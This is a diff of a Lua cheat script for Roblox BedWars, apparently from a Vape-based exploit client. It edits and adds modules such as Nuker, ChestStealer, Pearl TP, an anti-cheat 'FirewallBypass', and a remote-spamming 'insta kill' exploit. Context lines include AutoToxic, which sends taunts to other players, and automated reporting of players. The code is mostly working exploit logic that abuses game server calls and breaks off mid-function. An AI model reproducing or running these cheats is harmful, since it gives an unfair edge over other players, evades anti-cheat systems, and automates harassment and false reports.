@@ -9101,35 +8416,30 @@ runFunction(function()
 	})
 	AutoForgeWeapon = AutoForge.CreateDropdown({
 		Name = "Weapon",
-		Function = blankFunction,
+		Function = function() end,
 		List = {"Sword", "Dagger", "Scythe", "Great_Hammer"}
 	})
 	AutoForgeArmor = AutoForge.CreateToggle({
 		Name = "Armor",
-		Function = blankFunction,
+		Function = function() end,
 		Default = true
 	})
 	AutoForgeSword = AutoForge.CreateToggle({
 		Name = "Weapon",
-		Function = blankFunction
+		Function = function() end
 	})
 	AutoForgeBow = AutoForge.CreateToggle({
 		Name = "Bow",
-		Function = blankFunction
-	})
-	AutoForgeSingleScythe = AutoForge.CreateToggle({
-		Name = "Single Scythe",
-		Function = blankFunction,
-		HoverText = "buy a weapon once before armor is maxed"
+		Function = function() end
 	})
 	AutoForgeBuyAfter = AutoForge.CreateToggle({
 		Name = "Buy After",
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "buy a weapon after armor is maxed"
 	})
 	AutoForgeNotification = AutoForge.CreateToggle({
 		Name = "Notification",
-		Function = blankFunction,
+		Function = function() end,
 		Default = true
 	})
 end)
@@ -9145,7 +8455,7 @@ runFunction(function()
 				task.spawn(function()
 					repeat
 						task.wait()
-						for i,v in next, (playersService:GetPlayers()) do 
+						for i,v in pairs(playersService:GetPlayers()) do 
 							if v ~= lplr and alreadyreportedlist[v] == nil and v:GetAttribute("PlayerConnected") and WhitelistFunctions:GetWhitelist(v) == 0 then 
 								task.wait(1)
 								alreadyreportedlist[v] = true
@@ -9164,7 +8474,7 @@ runFunction(function()
 	})
 	AutoReportV2Notify = AutoReportV2.CreateToggle({
 		Name = "Notify",
-		Function = blankFunction
+		Function = function() end
 	})
 end)
 
@@ -9176,7 +8486,7 @@ runFunction(function()
 	local function removerepeat(str)
 		local newstr = ""
 		local lastlet = ""
-		for i,v in next, (str:split("")) do 
+		for i,v in pairs(str:split("")) do 
 			if v ~= lastlet then
 				newstr = newstr..v 
 				lastlet = v
@@ -9238,17 +8548,17 @@ runFunction(function()
 
 	local function findreport(msg)
 		local checkstr = removerepeat(msg:gsub("%W+", ""):lower())
-		for i,v in next, (reporttable) do 
+		for i,v in pairs(reporttable) do 
 			if checkstr:find(i) then 
 				return v, i
 			end
 		end
-		for i,v in next, (reporttableexact) do 
+		for i,v in pairs(reporttableexact) do 
 			if checkstr == i then 
 				return v, i
 			end
 		end
-		for i,v in next, (AutoToxicPhrases5.ObjectList) do 
+		for i,v in pairs(AutoToxicPhrases5.ObjectList) do 
 			if checkstr:find(v) then 
 				return "Bullying", v
 			end
@@ -9354,46 +8664,46 @@ runFunction(function()
 	})
 	AutoToxicGG = AutoToxic.CreateToggle({
 		Name = "AutoGG",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	AutoToxicWin = AutoToxic.CreateToggle({
 		Name = "Win",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	AutoToxicDeath = AutoToxic.CreateToggle({
 		Name = "Death",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	AutoToxicBedBreak = AutoToxic.CreateToggle({
 		Name = "Bed Break",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	AutoToxicBedDestroyed = AutoToxic.CreateToggle({
 		Name = "Bed Destroyed",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	AutoToxicRespond = AutoToxic.CreateToggle({
 		Name = "Respond",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	AutoToxicFinalKill = AutoToxic.CreateToggle({
 		Name = "Final Kill",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	AutoToxicTeam = AutoToxic.CreateToggle({
 		Name = "Teammates",
-		Function = blankFunction, 
+		Function = function() end, 
 	})
 	AutoToxicLagback = AutoToxic.CreateToggle({
 		Name = "Lagback",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	AutoToxicPhrases = AutoToxic.CreateTextList({
@@ -9447,8 +8757,8 @@ runFunction(function()
 			if bedwars.AppController:isAppOpen("ChestApp") then
 				local chest = lplr.Character:FindFirstChild("ObservedChestFolder")
 				local chestitems = chest and chest.Value and chest.Value:GetChildren() or {}
-				if #chestitems > 1 then
-					for i3,v3 in next, (chestitems) do
+				if #chestitems > 0 then
+					for i3,v3 in pairs(chestitems) do
 						if v3:IsA("Accessory") and (cheststealerdelays[v3] == nil or cheststealerdelays[v3] < tick()) then
 							task.spawn(function()
 								pcall(function()
@@ -9463,14 +8773,14 @@ runFunction(function()
 			end
 		end,
 		Closed = function()
-			for i, v in next, (collectionService:GetTagged("chest")) do
+			for i, v in pairs(collectionService:GetTagged("chest")) do
 				if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - v.Position).magnitude <= ChestStealerDistance.Value then
 					local chest = v:FindFirstChild("ChestFolderValue")
 					chest = chest and chest.Value or nil
 					local chestitems = chest and chest:GetChildren() or {}
-					if #chestitems > 1 then
+					if #chestitems > 0 then
 						bedwars.ClientHandler:GetNamespace("Inventory"):Get("SetObservedChest"):SendToServer(chest)
-						for i3,v3 in next, (chestitems) do
+						for i3,v3 in pairs(chestitems) do
 							if v3:IsA("Accessory") then
 								task.spawn(function()
 									pcall(function()
@@ -9494,8 +8804,8 @@ runFunction(function()
 				task.spawn(function()
 					repeat task.wait() until bedwarsStore.queueType ~= "bedwars_test"
 					if (not ChestStealerSkywars.Enabled) or bedwarsStore.queueType:find("skywars") then
-						repeat
-							task.wait(ReducePackets.Enabled and ReduceChestStealer.Enabled and 0.3 or 0.1) -- modification
+						repeat 
+							task.wait(0.1)
 							if entityLibrary.isAlive then
 								cheststealerfuncs[ChestStealerOpen.Enabled and "Open" or "Closed"]()
 							end
@@ -9510,24 +8820,24 @@ runFunction(function()
 		Name = "Range",
 		Min = 0,
 		Max = 18,
-		Function = blankFunction,
+		Function = function() end,
 		Default = 18
 	})
 	ChestStealerDelay = ChestStealer.CreateSlider({
 		Name = "Delay",
 		Min = 1,
 		Max = 50,
-		Function = blankFunction,
+		Function = function() end,
 		Default = 1,
 		Double = 100
 	})
 	ChestStealerOpen = ChestStealer.CreateToggle({
 		Name = "GUI Check",
-		Function = blankFunction
+		Function = function() end
 	})
 	ChestStealerSkywars = ChestStealer.CreateToggle({
 		Name = "Only Skywars",
-		Function = blankFunction,
+		Function = function() end,
 		Default = true
 	})
 end)
@@ -9654,7 +8964,7 @@ runFunction(function()
 				task.spawn(function()
 					repeat
 						local itemdrops = collectionService:GetTagged("ItemDrop")
-						for i,v in next, (itemdrops) do
+						for i,v in pairs(itemdrops) do
 							if entityLibrary.isAlive and (v:GetAttribute("ClientDropTime") and tick() - v:GetAttribute("ClientDropTime") > 2 or v:GetAttribute("ClientDropTime") == nil) then
 								if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - v.Position).magnitude <= PickupRangeRange.Value and (pickedup[v] == nil or pickedup[v] <= tick()) then
 									task.spawn(function()
@@ -9680,7 +8990,7 @@ runFunction(function()
 		Name = "Range",
 		Min = 1,
 		Max = 10, 
-		Function = blankFunction,
+		Function = function() end,
 		Default = 10
 	})
 end)
@@ -9731,7 +9041,7 @@ runFunction(function()
 									end
 									local newLaunchVelo = bedwars.ProjectileMeta[proj2].launchVelocity
 									local shootpos, shootvelo = predictGravity(pos, plr.RootPart.Velocity, (pos - offsetStartPos).Magnitude / newLaunchVelo, plr, playergrav)
-									if table.find(noveloproj, proj2) then
+									if proj2 == "telepearl" then
 										shootpos = pos
 										shootvelo = Vector3.zero
 									end
@@ -9742,6 +9052,7 @@ runFunction(function()
 										launchvelo = calculated
 										launchpos1 = offsetStartPos
 										launchpos2 = offsetStartPos
+										tab1.drawDurationSeconds = 1
 									else
 										break
 									end
@@ -9763,11 +9074,11 @@ runFunction(function()
 	BowExploitTarget = BowExploit.CreateDropdown({
 		Name = "Mode",
 		List = {"Mouse", "Range"},
-		Function = blankFunction
+		Function = function() end
 	})
 	BowExploitAutoShootFOV = BowExploit.CreateSlider({
 		Name = "FOV",
-		Function = blankFunction,
+		Function = function() end,
 		Min = 1,
 		Max = 1000,
 		Default = 1000
@@ -9821,52 +9132,10 @@ runFunction(function()
 end)
 
 runFunction(function()
-	local SetEmote = {Enabled = false}
-	local SetEmoteList = {Value = ""}
-	local oldemote
-	local SetEmoteName2 = {}
-	SetEmote = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-		Name = "SetEmote",
-		Function = function(callback)
-			if callback then
-				oldemote = bedwars.ClientStoreHandler:getState().Locker.selectedSpray
-				task.spawn(function()
-					repeat task.wait() until matchState ~= 0 or not SetEmote.Enabled
-					if SetEmote.Enabled then
-						oldemote = bedwars.ClientStoreHandler:getState().Locker.selectedSpray
-						bedwars.ClientStoreHandler:getState().Locker.selectedSpray = SetEmoteName2[SetEmoteList.Value]
-					end
-				end)
-			else
-				if oldemote then 
-					bedwars.ClientStoreHandler:getState().Locker.selectedSpray = oldemote
-					oldemote = nil 
-				end
-			end
-		end
-	})
-	local SetEmoteName = {}
-	for i,v in next, (bedwars.EmoteMeta) do 
-		table.insert(SetEmoteName, v.name)
-		SetEmoteName2[v.name] = i
-	end
-	table.sort(SetEmoteName, function(a, b) return a:lower() < b:lower() end)
-	SetEmoteList = SetEmote.CreateDropdown({
-		Name = "Emote",
-		List = SetEmoteName,
-		Function = function()
-			if SetEmote.Enabled then 
-				bedwars.ClientStoreHandler:getState().Locker.selectedSpray = SetEmoteName2[SetEmoteList.Value]
-			end
-		end
-	})
-end)
-
-runFunction(function()
 	local tiered = {}
 	local nexttier = {}
 
-	for i,v in next, (bedwars.ShopItems) do
+	for i,v in pairs(bedwars.ShopItems) do
 		if type(v) == "table" then 
 			if v.tiered then
 				tiered[v.itemType] = v.tiered
@@ -9881,14 +9150,14 @@ runFunction(function()
 		Name = "ShopTierBypass",
 		Function = function(callback) 
 			if callback then
-				for i,v in next, (bedwars.ShopItems) do
+				for i,v in pairs(bedwars.ShopItems) do
 					if type(v) == "table" then 
 						v.tiered = nil
 						v.nextTier = nil
 					end
 				end
 			else
-				for i,v in next, (bedwars.ShopItems) do
+				for i,v in pairs(bedwars.ShopItems) do
 					if type(v) == "table" then 
 						if tiered[v.itemType] then
 							v.tiered = tiered[v.itemType]
@@ -9926,7 +9195,7 @@ runFunction(function()
 		local closest, closestmag = nil, newmag * 3
 		if entityLibrary.isAlive then 
 			local tops = {}
-			for i,v in next, (bedwarsStore.blocks) do 
+			for i,v in pairs(bedwarsStore.blocks) do 
 				local close = getScaffold(closestpos(v), false)
 				if getPlacedBlock(close) then continue end
 				if close.Y < entityLibrary.character.HumanoidRootPart.Position.Y then continue end
@@ -9934,7 +9203,7 @@ runFunction(function()
 					table.insert(tops, close)
 				end
 			end
-			for i,v in next, (tops) do 
+			for i,v in pairs(tops) do 
 				local mag = (v - entityLibrary.character.HumanoidRootPart.Position).magnitude
 				if mag <= closestmag then 
 					closest = v
@@ -9981,14 +9250,14 @@ runFunction(function()
 												local newpos = (hori2 - hori1).Unit
 												local realnewpos = CFrame.new(newpos == newpos and entityLibrary.character.HumanoidRootPart.CFrame.p + (newpos * ((3 + getSpeed()) * dt)) or Vector3.zero)
 												entityLibrary.character.HumanoidRootPart.CFrame = CFrame.new(realnewpos.p.X, pos.Y, realnewpos.p.Z)
-												_VapeApi.antivoidvelo = newpos == newpos and newpos * 20 or Vector3.zero
-												entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(_VapeApi.antivoidvelo.X, entityLibrary.character.HumanoidRootPart.Velocity.Y, _VapeApi.antivoidvelo.Z)
+												antivoidvelo = newpos == newpos and newpos * 20 or Vector3.zero
+												entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(antivoidvelo.X, entityLibrary.character.HumanoidRootPart.Velocity.Y, antivoidvelo.Z)
 												if getPlacedBlock((entityLibrary.character.HumanoidRootPart.CFrame.p - Vector3.new(0, 1, 0)) + entityLibrary.character.HumanoidRootPart.Velocity.Unit) or getPlacedBlock(entityLibrary.character.HumanoidRootPart.CFrame.p + Vector3.new(0, 3)) then
 													pos = pos + Vector3.new(0, 1, 0)
 												end
 											else
 												RunLoops:UnbindFromHeartbeat("AntiVoid")
-												_VapeApi.antivoidvelo = nil
+												antivoidvelo = nil
 												antivoiding = false
 											end
 										end)
@@ -10024,10 +9293,10 @@ runFunction(function()
 		Function = function(val) 
 			if val == "Classic" then 
 				task.spawn(function()
-					repeat task.wait() until bedwarsStore.matchState ~= 0 or not _VapeApi.vapeInjected
-					if _VapeApi.vapeInjected and AntiVoidMoveMode.Value == "Classic" and antivoidypos == 0 and AntiVoid.Enabled then
+					repeat task.wait() until bedwarsStore.matchState ~= 0 or not vapeInjected
+					if vapeInjected and AntiVoidMoveMode.Value == "Classic" and antivoidypos == 0 and AntiVoid.Enabled then
 						local lowestypos = 99999
-						for i,v in next, (bedwarsStore.blocks) do 
+						for i,v in pairs(bedwarsStore.blocks) do 
 							local newray = workspace:Raycast(v.Position + Vector3.new(0, 800, 0), Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
 							if i % 200 == 0 then 
 								task.wait(0.06)
@@ -10160,7 +9429,7 @@ runFunction(function()
 
 	local function getItemFromList(list)
 		local selecteditem
-		for i3,v3 in next, (list) do
+		for i3,v3 in pairs(list) do
 			local item = getItem(v3)
 			if item then 
 				selecteditem = item
@@ -10171,7 +9440,7 @@ runFunction(function()
 	end
 
 	local function placelayer(layertab, obj, selecteditems)
-		for i2,v2 in next, (layertab) do
+		for i2,v2 in pairs(layertab) do
 			local selecteditem = getItemFromList(selecteditems)
 			if selecteditem then
 				bedwars.placeBlock(obj.Position + v2, selecteditem.itemType)
@@ -10188,7 +9457,7 @@ runFunction(function()
 		Function = function(callback)
             if callback then
                 task.spawn(function()
-                    for i, obj in next, (collectionService:GetTagged("bed")) do
+                    for i, obj in pairs(collectionService:GetTagged("bed")) do
                         if entityLibrary.isAlive and obj:GetAttribute("Team"..(lplr:GetAttribute("Team") or 0).."NoBreak") and obj.Parent ~= nil then
                             if (entityLibrary.character.HumanoidRootPart.Position - obj.Position).magnitude <= bedprotectorrange.Value then
                                 local firstlayerplaced = placelayer(bedprotector1stlayer, obj, {"obsidian", "stone_brick", "plank_oak", getWool()})
@@ -10225,14 +9494,14 @@ runFunction(function()
     local nukerluckyblock = {Enabled = false}
 	local nukerironore = {Enabled = false}
     local nukerbeds = {Enabled = false}
-	local nukercustom = {RefreshValues = blankFunction, ObjectList = {}}
+	local nukercustom = {RefreshValues = function() end, ObjectList = {}}
     local luckyblocktable = {}
 
 	Nuker = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
 		Name = "Nuker",
 		Function = function(callback)
             if callback then
-				for i,v in next, (bedwarsStore.blocks) do
+				for i,v in pairs(bedwarsStore.blocks) do
 					if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) or (nukerironore.Enabled and v.Name == "iron_ore") then
 						table.insert(luckyblocktable, v)
 					end
@@ -10253,13 +9522,13 @@ runFunction(function()
 							local broke = not entityLibrary.isAlive
 							local tool = (not nukerlegit.Enabled) and {Name = "wood_axe"} or bedwarsStore.localHand.tool
 							if nukerbeds.Enabled then
-								for i, obj in next, (collectionService:GetTagged("bed")) do
+								for i, obj in pairs(collectionService:GetTagged("bed")) do
 									if broke then break end
 									if obj.Parent ~= nil then
 										if obj:GetAttribute("BedShieldEndTime") then 
 											if obj:GetAttribute("BedShieldEndTime") > workspace:GetServerTimeNow() then continue end
 										end
-										if ((shared.pingbypassroot and shared.pingbypassroot.Position or entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - obj.Position).magnitude <= nukerrange.Value then
+										if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - obj.Position).magnitude <= nukerrange.Value then
 											if tool and bedwars.ItemTable[tool.Name].breakBlock and bedwars.BlockController:isBlockBreakable({blockPosition = obj.Position / 3}, lplr) then
 												local res, amount = getBestBreakSide(obj.Position)
 												local res2, amount2 = getBestBreakSide(obj.Position + Vector3.new(0, 0, 3))
@@ -10272,11 +9541,11 @@ runFunction(function()
 								end
 							end
 							broke = broke and not entityLibrary.isAlive
-							for i, obj in next, (luckyblocktable) do
+							for i, obj in pairs(luckyblocktable) do
 								if broke then break end
 								if entityLibrary.isAlive then
 									if obj and obj.Parent ~= nil then
-										if ((shared.pingbypassroot and shared.pingbypassroot.Position or entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - obj.Position).magnitude <= nukerrange.Value and (nukerown.Enabled or obj:GetAttribute("PlacedByUserId") ~= lplr.UserId) then
+										if ((entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position) - obj.Position).magnitude <= nukerrange.Value and (nukerown.Enabled or obj:GetAttribute("PlacedByUserId") ~= lplr.UserId) then
 											if tool and bedwars.ItemTable[tool.Name].breakBlock and bedwars.BlockController:isBlockBreakable({blockPosition = obj.Position / 3}, lplr) then
 												bedwars.breakBlock(obj.Position, nukereffects.Enabled, getBestBreakSide(obj.Position), true, nukeranimation.Enabled)
 												break
@@ -10304,7 +9573,7 @@ runFunction(function()
 	})
 	nukerlegit = Nuker.CreateToggle({
 		Name = "Hand Check",
-		Function = blankFunction
+		Function = function() end
 	})
 	nukereffects = Nuker.CreateToggle({
 		Name = "Show HealthBar & Effects",
@@ -10317,11 +9586,11 @@ runFunction(function()
 	})
 	nukeranimation = Nuker.CreateToggle({
 		Name = "Break Animation",
-		Function = blankFunction
+		Function = function() end
 	})
 	nukerown = Nuker.CreateToggle({
 		Name = "Self Break",
-		Function = blankFunction,
+		Function = function() end,
 	})
     nukerbeds = Nuker.CreateToggle({
 		Name = "Break Beds",
@@ -10330,14 +9599,14 @@ runFunction(function()
 	})
 	nukernofly = Nuker.CreateToggle({
 		Name = "Fly Disable",
-		Function = blankFunction
+		Function = function() end
 	})
     nukerluckyblock = Nuker.CreateToggle({
 		Name = "Break LuckyBlocks",
 		Function = function(callback) 
 			if callback then 
 				luckyblocktable = {}
-				for i,v in next, (bedwarsStore.blocks) do
+				for i,v in pairs(bedwarsStore.blocks) do
 					if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) or (nukerironore.Enabled and v.Name == "iron_ore") then
 						table.insert(luckyblocktable, v)
 					end
@@ -10353,7 +9622,7 @@ runFunction(function()
 		Function = function(callback) 
 			if callback then 
 				luckyblocktable = {}
-				for i,v in next, (bedwarsStore.blocks) do
+				for i,v in pairs(bedwarsStore.blocks) do
 					if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) or (nukerironore.Enabled and v.Name == "iron_ore") then
 						table.insert(luckyblocktable, v)
 					end
@@ -10368,7 +9637,7 @@ runFunction(function()
 		TempText = "block (tesla_trap)",
 		AddFunction = function()
 			luckyblocktable = {}
-			for i,v in next, (bedwarsStore.blocks) do
+			for i,v in pairs(bedwarsStore.blocks) do
 				if table.find(nukercustom.ObjectList, v.Name) or (nukerluckyblock.Enabled and v.Name:find("lucky")) then
 					table.insert(luckyblocktable, v)
 				end
@@ -10426,7 +9695,7 @@ runFunction(function()
 	SafeWalkMode = SafeWalk.CreateDropdown({
 		Name = "Mode",
 		List = {"Optimized", "Accurate"},
-		Function = blankFunction
+		Function = function() end
 	})
 end)
 
@@ -10467,7 +9736,7 @@ runFunction(function()
 	}
 
 	local function isNearBlock(pos)
-		for i,v in next, (aroundpos) do
+		for i,v in pairs(aroundpos) do
 			if getPlacedBlock(pos + v) then
 				return true
 			end
@@ -10477,7 +9746,7 @@ runFunction(function()
 
 	local function gethighlightboxatpos(pos)
 		if tempfolder then
-			for i,v in next, (tempfolder:GetChildren()) do
+			for i,v in pairs(tempfolder:GetChildren()) do
 				if v.Position == pos then
 					return v 
 				end
@@ -10488,7 +9757,7 @@ runFunction(function()
 
 	local function removeduplicates(tab)
 		local actualpositions = {}
-		for i,v in next, (tab) do
+		for i,v in pairs(tab) do
 			if table.find(actualpositions, Vector3.new(v.X, v.Y, v.Z)) == nil then
 				table.insert(actualpositions, Vector3.new(v.X, v.Y, v.Z))
 			else
@@ -10501,7 +9770,7 @@ runFunction(function()
 	end
 
 	local function rotate(tab)
-		for i,v in next, (tab) do
+		for i,v in pairs(tab) do
 			local radvec, radius = entityLibrary.character.HumanoidRootPart.CFrame:ToAxisAngle()
 			radius = (radius * 57.2957795)
 			radius = math.round(radius / 90) * 90
@@ -10518,7 +9787,7 @@ runFunction(function()
 
 	local function getmaterials(tab)
 		local materials = {}
-		for i,v in next, (tab) do
+		for i,v in pairs(tab) do
 			materials[v.blockType] = (materials[v.blockType] and materials[v.blockType] + 1 or 1)
 		end
 		return materials
@@ -10557,7 +9826,7 @@ runFunction(function()
 					if positions["start_block"] == nil then
 						bedwars.placeBlock(newpos)
 					end
-					for i2,v2 in next, (positions.blocks) do
+					for i2,v2 in pairs(positions.blocks) do
 						local texturetxt = bedwars.ItemTable[(v2.blockType == "wool_white" and getWool() or v2.blockType)].block.greedyMesh.textures[1]
 						local newerpos = (newpos + Vector3.new(v2.X, v2.Y, v2.Z))
 						local block = Instance.new("Part")
@@ -10567,7 +9836,7 @@ runFunction(function()
 						block.Transparency = (SchematicaTransparency.Value == 10 and 0 or 1)
 						block.Anchored = true
 						block.Parent = tempfolder
-						for i3,v3 in next, (Enum.NormalId:GetEnumItems()) do
+						for i3,v3 in pairs(Enum.NormalId:GetEnumItems()) do
 							local texture = Instance.new("Texture")
 							texture.Face = v3
 							texture.Texture = texturetxt
@@ -10580,7 +9849,7 @@ runFunction(function()
 						repeat
 							task.wait(.1)
 							if not Schematica.Enabled then break end
-							for i,v in next, (positions.blocks) do
+							for i,v in pairs(positions.blocks) do
 								local newerpos = (newpos + Vector3.new(v.X, v.Y, v.Z))
 								if entityLibrary.isAlive and (entityLibrary.character.HumanoidRootPart.Position - newerpos).magnitude <= 30 and isNearBlock(newerpos) and bedwars.BlockController:isAllowedPlacement(lplr, getWool(), newerpos / 3, 0) then
 									schemplaceblock(newerpos, (v.blockType == "wool_white" and getWool() or v.blockType), function()
@@ -10630,7 +9899,7 @@ runFunction(function()
 				uilistlayoutschmatica:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
 					tempgui.Size = UDim2.new(0, 220, 0, uilistlayoutschmatica.AbsoluteContentSize.Y)
 				end)
-				for i4,v4 in next, (getmaterials(res.blocks)) do
+				for i4,v4 in pairs(getmaterials(res.blocks)) do
 					local testframe = Instance.new("Frame")
 					testframe.Size = UDim2.new(0, 220, 0, 40)
 					testframe.BackgroundTransparency = 1
@@ -10662,9 +9931,9 @@ runFunction(function()
 		Default = 7,
 		Function = function()
 			if tempfolder then
-				for i2,v2 in next, (tempfolder:GetChildren()) do
+				for i2,v2 in pairs(tempfolder:GetChildren()) do
 					v2.Transparency = (SchematicaTransparency.Value == 10 and 0 or 1)
-					for i3,v3 in next, (v2:GetChildren()) do
+					for i3,v3 in pairs(v2:GetChildren()) do
 						v3.Transparency = (SchematicaTransparency.Value == 10 and 0 or (1 / SchematicaTransparency.Value))
 					end
 				end
@@ -10674,27 +9943,2999 @@ runFunction(function()
 end)
 
 runFunction(function()
-    local Disabler = {Enabled = false}
-    Disabler = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-        Name = "FirewallBypass",
+			local Disabler = {Enabled = false}
+			Disabler = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+				Name = "FirewallBypass",
+				Function = function(callback)
+					if callback then 
+						task.spawn(function()
+							repeat task.wait()
+								local item = getItemNear("scythe")
+								if item and bedwars.CombatController and isAlive() then
+									if GetHandItem() and GetHandItem() ~= item.tool and not killauraNearPlayer and GalaxywareStore.projectileAuraTick <= tick() then
+										switchItem(item.tool)
+									end
+									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({direction = lplr.Character.Humanoid.MoveDirection + lplr.Character.HumanoidRootPart.CFrame.lookVector})
+									if lplr.Character.Head.Transparency ~= 0 then
+										bedwarsStore.scythe = tick() + 1
+									end 
+								end
+							until (not Disabler.Enabled)
+						end)
+					end
+				end,
+				HoverText = "Float disabler (and some speed check) with scythe"
+			})
+		end)
+
+runFunction(function()
+  local InfernalKill = {Enabled = false}
+InfernalKill = GuiLibrary["ObjectsThatCanBeSaved"]["CombatWindow"]["Api"].CreateOptionsButton({
+    ["Name"] = "4BigGuysExploit",
+    ["Function"] = function(callback)
+        if callback then
+            repeat
+            wait(0.001)
+            function getNil(name,class) for _,v in next, getnilinstances() do if v.ClassName==class and v.Name==name then return v;end end end
+            local args = {
+                [1] = {
+                    ["chargeTime"] = 0.5,
+                    ["player"] = game:GetService("Players").LocalPlayer,
+                    ["weapon"] = getNil("infernal_saber", "Accessory")
+                }
+            }
+
+            game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("HellBladeRelease"):FireServer(unpack(args))
+        until not InfernalKill["Enabled"]
+    end
+        end,
+        ["HoverText"] = "Infernal saber insta kill lolol"
+    })
+end)
+
+
+-- Cqded made this shit down below (Got perms)
+
+runFunction(function()
+    local ChestExploit = {Enabled = false}
+    ChestExploit = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
+        Name = "ChestExploit",
         Function = function(callback)
-            if callback then 
+            if callback then
+				task.spawn(function()
+					while task.wait() do
+					    if (not ChestExploit.Enabled) then return end
+						repeat task.wait() until bedwarsStore.matchState ~= 0
+						--not mine lol
+					    for i, v in pairs(game:GetService("CollectionService"):GetTagged("chest")) do
+						    if v:FindFirstChild("ChestFolderValue") then
+							    local chest = v:FindFirstChild("ChestFolderValue")
+							    chest = chest and chest.Value or nil
+							    require(game:GetService("ReplicatedStorage").TS.remotes).default.Client:GetNamespace("Inventory"):Get("SetObservedChest"):SendToServer(chest)
+							end
+						end
+					end
+				end)
+            end
+        end
+    })
+end)
+
+runFunction(function()
+    local TelepearlExploit = {Enabled = false}
+
+	local function GetClosestPlayer()
+		local ClosestPlayer = nil
+
+		for i, v in pairs(game:GetService("Players"):GetChildren()) do
+			if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
+				if v and v ~= lplr then
+					local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
+					if TargetDistance < 9e9 then
+						if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
+							ClosestPlayer = v
+						end
+					end
+				end
+			end
+		end
+
+		return ClosestPlayer
+	end
+
+    TelepearlExploit = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+        Name = "Pearl TP",
+        Function = function(callback)
+            if callback then
+				task.spawn(function()
+					if IsAlive(lplr) and getItem("telepearl") then
+						if GetClosestPlayer() ~= nil then
+							switchItem(getItem("telepearl").tool)
+							bedwars.ClientHandler:Get(bedwars.ProjectileRemote):CallServerAsync(getItem("telepearl").tool, "telepearl", "telepearl", GetClosestPlayer().Character.HumanoidRootPart.Position - Vector3.new(0,4,0), GetClosestPlayer().Character.HumanoidRootPart.Position - Vector3.new(0,4,0), GetClosestPlayer().Character.HumanoidRootPart.Position, game:GetService("HttpService"):GenerateGUID(), {["drawDurationSeconds"] = 1})
+							
+							task.spawn(function()
+								task.wait(0.16)
+								if lplr.Character.HandInvItem.Value ~= getItem("telepearl").tool then
+									warningNotification("Pearl TP", "Failed to find telepearl", 3)
+								end
+							end)
+					    else
+							warningNotification("Pearl TP", "Failed to find player", 3)
+						end
+					else
+						warningNotification("Pearl TP", "Telepearl required", 3)
+					end
+				end)
+
+				TelepearlExploit.ToggleButton(false)
+            end
+        end
+    })
+end)
+
+runFunction(function()
+    local AutoSkywars = {Enabled = false}
+    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+        Name = "AutoSkywars",
+        Function = function(callback)
+            if callback then
+				task.spawn(function()
+					if bedwarsStore.queueType:find("skywars") then
+						if bedwarsStore.matchState ~= 0 then return end
+						repeat task.wait() until bedwarsStore.matchState ~= 0
+						if (not AutoSkywars.Enabled) then return end
+						task.wait(0.1)
+						local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
+						tween:Play()
+						tween.Completed:Wait()
+						task.wait(0.5)
+						workspace.SpectatorPlatform.floor.CanCollide = false
+					end
+				end)
+            end
+        end
+    })
+end)
+
+runFunction(function()
+	local TPDown = {Enabled = false}
+	local Ground = {Enabled = false}
+	local Studs = {Value = 1}
+	TPDown = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+		["Name"] = "TPDown",
+		["Function"] = function(callback)
+			if callback then 
+				task.spawn(function()
+					if entityLibrary.isAlive then
+						if (not Ground.Enabled) then
+							lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
+							lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame - Vector3.new(0,Studs.Value,0)
+						else
+							local ray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
+
+							if ray then
